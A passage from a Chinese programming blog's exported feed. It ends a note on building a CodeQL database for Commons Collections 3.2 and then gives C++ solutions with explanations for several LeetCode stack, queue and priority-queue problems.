<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line">  <span class="tag">&lt;<span class="name">profile</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">id</span>&gt;</span>jdk-1.7<span class="tag">&lt;/<span class="name">id</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">activation</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">activeByDefault</span>&gt;</span>true<span class="tag">&lt;/<span class="name">activeByDefault</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">jdk</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">jdk</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">activation</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">maven.compiler.compilerVersion</span>&gt;</span>1.7<span class="tag">&lt;/<span class="name">maven.compiler.compilerVersion</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span> </span><br><span class="line"><span class="tag">&lt;/<span class="name">profile</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>但是还是报错了,最后去环境变量里面把JAVA_HOME改成1.7的就行了(到这里终于目标为啥配环境变量的时候非得搞个叫JAVA_HOME的,而不是直接往path里面添加,改起来是真滴快啊)</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/3ec4b8d3b4b6e92bacb55f064798a99f.png" alt="image-20220512155048464"></p>
<h4 id="成功"><a href="#成功" class="headerlink" title="成功"></a>成功</h4><p>最后再次打开命令行输入</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">codeql database create D:\TOOLS\codeql\database\commons-collection3.2 --language=<span class="string">&quot;java&quot;</span> --<span class="built_in">command</span>=<span class="string">&quot;mvn clean install --file pom.xml&quot;</span> --source-root=D:\TOOLS\codeql\soutce-project\commons-collections --overwrite </span><br></pre></td></tr></table></figure>

<p>成功构建cc3的数据库</p>
<p><img src="https://img-blog.csdnimg.cn/img_convert/25f2a1ac18122cb378b43056fe34a42f.png" alt="image-20220512155241642"></p>
]]></content>
      <categories>
        <category>codeql</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>codeql</tag>
      </tags>
  </entry>
  <entry>
    <title>栈和队列</title>
    <url>/2024/09/28/%E6%A0%88%E5%92%8C%E9%98%9F%E5%88%97/</url>
    <content><![CDATA[<h1 id="栈和队列"><a href="#栈和队列" class="headerlink" title="栈和队列"></a>栈和队列</h1><h4 id="232-用栈实现队列"><a href="#232-用栈实现队列" class="headerlink" title="232. 用栈实现队列"></a><a href="https://leetcode.cn/problems/implement-queue-using-stacks/">232. 用栈实现队列</a></h4><p>本题是一道模板题,创建两个栈in和out只需注意以下两点</p>
<ol>
<li>入元素入到in栈,出元素从out栈出</li>
<li>in栈往out栈倒元素需要一次性倒完,out栈只有为空的时候才能进元素</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyQueue</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    stack&lt;<span class="keyword">int</span>&gt; in;</span><br><span class="line">    stack&lt;<span class="keyword">int</span>&gt; out;</span><br><span class="line">    <span class="built_in">MyQueue</span>() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123; in.<span class="built_in">push</span>(x); &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!out.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> a = out.<span class="built_in">top</span>();</span><br><span class="line">            out.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (!in.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                out.<span class="built_in">push</span>(in.<span class="built_in">top</span>());</span><br><span class="line">                in.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> a = out.<span class="built_in">top</span>();</span><br><span class="line">            out.<span class="built_in">pop</span>();</span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">peek</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!out.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">int</span> a = out.<span class="built_in">top</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (!in.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">                out.<span class="built_in">push</span>(in.<span class="built_in">top</span>());</span><br><span class="line">                in.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> a = out.<span class="built_in">top</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> a;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (in.<span class="built_in">empty</span>() &amp;&amp; out.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyQueue object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyQueue* obj = new MyQueue();</span></span><br><span class="line"><span class="comment"> * obj-&gt;push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj-&gt;pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj-&gt;peek();</span></span><br><span class="line"><span class="comment"> * bool param_4 = obj-&gt;empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>



<h4 id="225-用队列实现栈"><a href="#225-用队列实现栈" class="headerlink" title="225. 用队列实现栈"></a><a href="https://leetcode.cn/problems/implement-stack-using-queues/">225. 用队列实现栈</a></h4><p>用一个元素实现队列,元素正常入队,但是当出元素的时候需要把前n-1个元素出队再重新入队之后,再把第一个元素出队</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyStack</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">queue&lt;<span class="keyword">int</span>&gt; q;</span><br><span class="line">    <span class="built_in">MyStack</span>() &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">        q.<span class="built_in">push</span>(x);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">pop</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> move=q.<span class="built_in">size</span>()<span class="number">-1</span>;</span><br><span class="line">        <span class="keyword">int</span> temp=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(move--)&#123;</span><br><span class="line">            temp=q.<span class="built_in">front</span>();</span><br><span class="line">            q.<span class="built_in">pop</span>();</span><br><span class="line">            q.<span class="built_in">push</span>(temp);</span><br><span class="line">        &#125;</span><br><span class="line">        temp=q.<span class="built_in">front</span>();</span><br><span class="line">        q.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> temp;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">top</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> q.<span class="built_in">back</span>();<span class="comment">//stl库里面的queue队尾元素是back</span></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">empty</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> q.<span class="built_in">empty</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your MyStack object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * MyStack* obj = new MyStack();</span></span><br><span class="line"><span class="comment"> * obj-&gt;push(x);</span></span><br><span class="line"><span class="comment"> * int param_2 = obj-&gt;pop();</span></span><br><span class="line"><span class="comment"> * int param_3 = obj-&gt;top();</span></span><br><span class="line"><span class="comment"> * bool param_4 = obj-&gt;empty();</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>



<h4 id="20-有效的括号"><a href="#20-有效的括号" class="headerlink" title="20. 有效的括号"></a><a href="https://leetcode.cn/problems/valid-parentheses/">20. 有效的括号</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011122874.png" alt="image-20241001112224811"></p>
<p>思路：遇到左括号就入栈，遇到右括号检查栈顶是不是对应的左括号（若栈为空说明右括号多了，也不合法），是则把左括号出栈，不是则说明不匹配，直接return false</p>
<p>最后遍历完字符串栈应该为空，若栈中还有剩余元素，则说明左括号多了</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">isValid</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="keyword">char</span>&gt; st;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (s[i] == <span class="string">&#x27;(&#x27;</span> || s[i] == <span class="string">&#x27;[&#x27;</span> || s[i] == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                st.<span class="built_in">push</span>(s[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">//处理栈空但是来了右括号的情况</span></span><br><span class="line">                <span class="keyword">if</span>(s[i] == <span class="string">&#x27;)&#x27;</span> || s[i] == <span class="string">&#x27;]&#x27;</span> || s[i] == <span class="string">&#x27;&#125;&#x27;</span>)&#123;</span><br><span class="line">                    <span class="keyword">if</span>(st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!st.<span class="built_in">empty</span>() &amp;&amp; s[i] == <span class="string">&#x27;)&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (st.<span class="built_in">top</span>() == <span class="string">&#x27;(&#x27;</span>) &#123;</span><br><span class="line">                        st.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">//已经失配了,提前结束</span></span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!st.<span class="built_in">empty</span>() &amp;&amp; s[i] == <span class="string">&#x27;]&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (st.<span class="built_in">top</span>() == <span class="string">&#x27;[&#x27;</span>) &#123;</span><br><span class="line">                        st.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!st.<span class="built_in">empty</span>() &amp;&amp; s[i] == <span class="string">&#x27;&#125;&#x27;</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (st.<span class="built_in">top</span>() == <span class="string">&#x27;&#123;&#x27;</span>) &#123;</span><br><span class="line">                        st.<span class="built_in">pop</span>();</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h4 id="1047-删除字符串中的所有相邻重复项"><a href="#1047-删除字符串中的所有相邻重复项" class="headerlink" title="1047. 删除字符串中的所有相邻重复项"></a><a href="https://leetcode.cn/problems/remove-all-adjacent-duplicates-in-string/">1047. 删除字符串中的所有相邻重复项</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011122662.png" alt="image-20241001112235594"></p>
<p>栈为空或者栈顶元素不等于当前元素则入栈当前元素，如果发现栈顶元素和当前遍历到的元素相同，则把栈顶元素出栈后继续循环，最后逐个出栈并且reverse即可</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">string <span class="title">removeDuplicates</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="keyword">char</span>&gt; st;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; s.<span class="built_in">length</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (st.<span class="built_in">empty</span>() || st.<span class="built_in">top</span>() != s[i]) &#123;</span><br><span class="line">                st.<span class="built_in">push</span>(s[i]);</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (st.<span class="built_in">top</span>() == s[i]) &#123;</span><br><span class="line">                st.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        string res;</span><br><span class="line">        <span class="keyword">while</span> (!st.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            res += st.<span class="built_in">top</span>();</span><br><span class="line">            st.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">reverse</span>(res.<span class="built_in">begin</span>(), res.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="150-逆波兰表达式求值"><a href="#150-逆波兰表达式求值" class="headerlink" title="150. 逆波兰表达式求值"></a><a href="https://leetcode.cn/problems/evaluate-reverse-polish-notation/">150. 逆波兰表达式求值</a></h4><p>后缀表达式求值，遇到数字入栈，遇到操作符则弹出两个操作数计算完后再入栈</p>
<p>注意：先弹出的是右操作数，后弹出的是左操作数</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">evalRPN</span><span class="params">(vector&lt;string&gt;&amp; tokens)</span> </span>&#123;</span><br><span class="line">        stack&lt;<span class="keyword">int</span>&gt; nums;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; tokens.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="comment">// 遍历到操作符</span></span><br><span class="line">            <span class="keyword">if</span> (tokens[i] == <span class="string">&quot;+&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> b = nums.<span class="built_in">top</span>();</span><br><span class="line">                nums.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">int</span> a = nums.<span class="built_in">top</span>();</span><br><span class="line">                nums.<span class="built_in">pop</span>();</span><br><span class="line">                nums.<span class="built_in">push</span>(a + b);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tokens[i] == <span class="string">&quot;-&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> b = nums.<span class="built_in">top</span>();</span><br><span class="line">                nums.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">int</span> a = nums.<span class="built_in">top</span>();</span><br><span class="line">                nums.<span class="built_in">pop</span>();</span><br><span class="line">                nums.<span class="built_in">push</span>(a - b);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tokens[i] == <span class="string">&quot;*&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> b = nums.<span class="built_in">top</span>();</span><br><span class="line">                nums.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">int</span> a = nums.<span class="built_in">top</span>();</span><br><span class="line">                nums.<span class="built_in">pop</span>();</span><br><span class="line">                nums.<span class="built_in">push</span>(a * b);</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (tokens[i] == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> b = nums.<span class="built_in">top</span>();</span><br><span class="line">                nums.<span class="built_in">pop</span>();</span><br><span class="line">                <span class="keyword">int</span> a = nums.<span class="built_in">top</span>();</span><br><span class="line">                nums.<span class="built_in">pop</span>();</span><br><span class="line">                nums.<span class="built_in">push</span>(a / b);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 是数字</span></span><br><span class="line">                nums.<span class="built_in">push</span>(<span class="built_in">stoi</span>(tokens[i]));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> nums.<span class="built_in">top</span>();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>



<h4 id="239-滑动窗口最大值"><a href="#239-滑动窗口最大值" class="headerlink" title="239. 滑动窗口最大值"></a><a href="https://leetcode.cn/problems/sliding-window-maximum/">239. 滑动窗口最大值</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202409291817643.png"></p>
<p>本题的难点在于如何维护每一次滑动窗口移动后的最大值</p>
<p>思路是:</p>
<ol>
<li>采用一个双端队列<code>deque</code>并自定义<code>pop</code>和<code>push</code>操作来搞一个单调队列</li>
<li>规则:<ol>
<li>出队的时候只有当前要出滑动窗口的元素等于队首元素才将队首元素<code>pop()</code></li>
<li>入的时候从队尾入,如果队空直接入,如果队尾元素小于要入队的元素val,则一直<code>pop_back()</code>,直到deque为空或者队尾元素大于等于val的时候停止出队,把val入队</li>
<li>入队的时候如果val小于队尾元素,则不对队列做任何操作</li>
</ol>
</li>
<li>原因与特点:<ol>
<li>维护的队列队首元素始终是滑动窗口区间最大值,队列中元素是(不严格)单调递减的</li>
<li>能入队的元素都是有可能成为最大元素的元素</li>
<li>不能入队的元素至少在它之前的</li>
</ol>
</li>
</ol>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">maxSlidingWindow</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        deque&lt;<span class="keyword">int</span>&gt; dq;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            <span class="built_in">push</span>(dq, nums[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        res.<span class="built_in">push_back</span>(dq.<span class="built_in">front</span>());</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = k; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="built_in">pop</span>(dq, nums[i - k]);</span><br><span class="line">            <span class="built_in">push</span>(dq, nums[i]);</span><br><span class="line">            res.<span class="built_in">push_back</span>(dq.<span class="built_in">front</span>());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">pop</span><span class="params">(deque&lt;<span class="keyword">int</span>&gt;&amp; dq, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!dq.<span class="built_in">empty</span>() &amp;&amp; dq.<span class="built_in">front</span>() == val) &#123;</span><br><span class="line">            dq.<span class="built_in">pop_front</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">push</span><span class="params">(deque&lt;<span class="keyword">int</span>&gt;&amp; dq, <span class="keyword">int</span> val)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (dq.<span class="built_in">empty</span>()) &#123;</span><br><span class="line">            dq.<span class="built_in">push_back</span>(val);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (!dq.<span class="built_in">empty</span>() &amp;&amp; val &gt; dq.<span class="built_in">back</span>()) &#123;</span><br><span class="line">                dq.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125;</span><br><span class="line">            dq.<span class="built_in">push_back</span>(val);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="优先队列-堆"><a href="#优先队列-堆" class="headerlink" title="优先队列(堆)"></a>优先队列(堆)</h3><h4 id="347-前-K-个高频元素"><a href="#347-前-K-个高频元素" class="headerlink" title="347. 前 K 个高频元素"></a><a href="https://leetcode.cn/problems/top-k-frequent-elements/">347. 前 K 个高频元素</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011124054.png" alt="image-20241001112359989"></p>
<p>先用map存储对应出现的次数,然后再维护大小为k的小根堆,对map中的元素逐个入堆,当元素大于k时候出堆一个元素(这个出堆的元素一定是当前元素中最小的),最后留在小根堆中的元素一定是k个最大的</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">myCmp</span> &#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&amp; a, pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&amp; b)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> a.second &gt; b.second;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="function">vector&lt;<span class="keyword">int</span>&gt; <span class="title">topKFrequent</span><span class="params">(vector&lt;<span class="keyword">int</span>&gt;&amp; nums, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">        unordered_map&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt; mp;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">auto</span> iter = mp.<span class="built_in">find</span>(nums[i]);</span><br><span class="line">            <span class="keyword">if</span> (iter == mp.<span class="built_in">end</span>()) &#123;</span><br><span class="line">                mp.<span class="built_in">insert</span>(&#123;nums[i], <span class="number">1</span>&#125;);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                iter-&gt;second++;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        priority_queue&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;, vector&lt;pair&lt;<span class="keyword">int</span>, <span class="keyword">int</span>&gt;&gt;, myCmp&gt; priQ;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> iter = mp.<span class="built_in">begin</span>(); iter != mp.<span class="built_in">end</span>(); iter++) &#123;</span><br><span class="line">            priQ.<span class="built_in">push</span>(*iter);</span><br><span class="line">            <span class="keyword">if</span> (priQ.<span class="built_in">size</span>() &gt; k) &#123;</span><br><span class="line">                priQ.<span class="built_in">pop</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;<span class="keyword">int</span>&gt; res;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++) &#123;</span><br><span class="line">            res.<span class="built_in">push_back</span>(priQ.<span class="built_in">top</span>().first);</span><br><span class="line">            priQ.<span class="built_in">pop</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h4 id="1845-座位预约管理系统"><a href="#1845-座位预约管理系统" class="headerlink" title="1845. 座位预约管理系统"></a><a href="https://leetcode.cn/problems/seat-reservation-manager/">1845. 座位预约管理系统</a></h4><p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/202410011124413.png" alt="image-20241001112434327"></p>
<p>这题用小根堆非常适合,建立堆的时间复杂度是O(n),每次插入元素要从叶子结点开始”上刀山”为O(logN),每次删除结点也为O(logN)</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SeatManager</span> &#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cmp</span> &#123;</span></span><br><span class="line">        <span class="function"><span class="keyword">bool</span> <span class="title">operator</span><span class="params">()</span><span class="params">(<span class="keyword">int</span>&amp; a, <span class="keyword">int</span>&amp; b)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> a &gt; b; <span class="comment">// 好奇怪,为什么小根堆是大于号......</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    priority_queue&lt;<span class="keyword">int</span>, vector&lt;<span class="keyword">int</span>&gt;, cmp&gt; pq;</span><br><span class="line">    <span class="built_in">SeatManager</span>(<span class="keyword">int</span> n) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            pq.<span class="built_in">push</span>(i);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">int</span> <span class="title">reserve</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res = pq.<span class="built_in">top</span>();</span><br><span class="line">        pq.<span class="built_in">pop</span>();</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">unreserve</span><span class="params">(<span class="keyword">int</span> seatNumber)</span> </span>&#123; pq.<span class="built_in">push</span>(seatNumber); &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Your SeatManager object will be instantiated and called as such:</span></span><br><span class="line"><span class="comment"> * SeatManager* obj = new SeatManager(n);</span></span><br><span class="line"><span class="comment"> * int param_1 = obj-&gt;reserve();</span></span><br><span class="line"><span class="comment"> * obj-&gt;unreserve(seatNumber);</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>leetcode</category>
      </categories>
      <tags>
        <tag>c++</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>背忘录项目开发记录</title>
    <url>/2022/07/18/%E8%83%8C%E5%BF%98%E5%BD%95%E9%A1%B9%E7%9B%AE%E5%BC%80%E5%8F%91%E8%AE%B0%E5%BD%95/</url>
